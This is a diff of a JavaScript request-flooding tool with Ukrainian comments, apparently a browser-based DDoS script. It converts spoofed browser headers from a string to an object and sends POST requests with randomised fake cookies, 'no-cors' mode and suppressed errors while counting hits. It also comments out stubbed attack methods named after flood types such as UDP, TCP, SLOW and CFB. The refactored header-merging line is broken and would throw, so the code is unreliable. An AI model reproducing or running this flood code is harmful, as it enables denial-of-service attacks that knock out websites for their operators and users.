@@ -1,38 +1,38 @@
-const BASE_HEADERS = 
-
-`Accept-Encoding: gzip, deflate, br\r
-Accept-Language: en-US,en;q=0.9\r
-Cache-Control: max-age=0\r
-Connection: Keep-Alive\r
-Sec-Fetch-Dest: document\r
-Sec-Fetch-Mode: navigate\r
-Sec-Fetch-Site: none\r
-Sec-Fetch-User: ?1\r
-Sec-Gpc: 1\r
-Pragma: no-cache\r
-Upgrade-Insecure-Requests: 1\r\n`;
+const BASE_HEADERS = {
+'Accept-Encoding':'gzip, deflate, br',
+'Accept-Language':'en-US,en;q=0.9',
+'Cache-Control':'max-age=0',
+'Connection':'Keep-Alive',
+'Sec-Fetch-Dest':'document',
+'Sec-Fetch-Mode':'navigate',
+'Sec-Fetch-Site':'none',
+'Sec-Fetch-User':'?1',
+'Sec-Gpc':'1',
+'Pragma':'no-cache',
+'Upgrade-Insecure-Requests': '1'
+};
 
 const BASIC_MODES = {
 	mode: 'no-cors',
 	referrerPolicy: 'no-referrer',
 	cache: 'no-cache',
 	expires: 0
-}
+};
 
-const POST = {method: "POST"}
-const GET = {method: "GET"}
+const POST = {method: "POST"};
+const GET = {method: "GET"};
 
 const MIME = {
 	json: "application/json",
 	xml: "application/xml"
-}
+};
 
 
 /**
  * Змішування заголовків
- * @param {String} headers 
+ * @param {JSON} headers 
  */
-const composeHeaders = headers => BASE_HEADERS + headers;
+const composeHeaders = headers => Object(...BASE_HEADERS, ...headers);
 
 /**
  * Змішування заголовків для POST запитів
@@ -45,13 +45,15 @@ function composePostHeaders(cl, ct, body) {
 	return {
 		...POST,
 		headers: composeHeaders(
-			`Content-Length: ${cl}\r
-			X-Requested-With: XMLHttpRequest\r
-			Content-Type: ${ct}\r`
+			{
+				'Content-Length': cl,
+				'X-Requested-With': 'XMLHttpRequest',
+				'Content-Type': ct
+			}
 		),
 		body: body
 	}
-}
+};
 
 /**
  * Генератор POST запиту
@@ -81,7 +83,7 @@ async function request(target, config) {
 	)
 	.catch(()=>{})
 	.then(add_count);
-}
+};
 
 /**
  * Методи
@@ -121,52 +123,27 @@ class Methods {
 		return await request(this.target[0], {
 			...POST,
 			headers: composeHeaders(
-				`Cookie: _ga=GA${getRandomArbitrary(1000, 99999)};
+				{'Cookie': `_ga=GA${getRandomArbitrary(1000, 99999)};
 				 _gat=1;
 				 __cfduid=dc232334gwdsd23434542342342342475611928;
-				 ${Packet(6)}=${Packet(32)}\r`
+				 ${Packet(6)}=${Packet(32)}`}
 			)
 		})
 	}
-	async APACHE() {
-		// Not Implemented
-	}
-	async XMLRPC() {
-		// Not Implemented
-	}
-	async PPS() {
-		// Not Implemented
-	}
-	async DYN() {
-		// Not Implemented
-	}
-	async CFB() {
-		// Not Implemented
-	}
-	async EVEN() {
-		// Not Implemented
-	}
-	async SLOW() {
-		// Not Implemented
-	}
-	async TCP() {
-		// Not Implemented
-	}
-	async RHEX() {
-		// Not Implemented
-	}
-	async STOMP() {
-		// Not Implemented
-	}
-	async UDP() {
-		// Not Implemented
-	}
-	async VSE() {
-		// Not Implemented
-	}
-	async GET() {
-		// Not Implemented
-	}
-	
-	
+	/*
+	async APACHE() {}
+	async XMLRPC() {}
+	async PPS() {}
+	async DYN() {}
+	async CFB() {}
+	async EVEN() {}
+	async SLOW() {}
+	async TCP() {}
+	async RHEX() {}
+	async STOMP() {}
+	async UDP() {}
+	async VSE() {}
+	async GET() {}
+	*/
 }
+
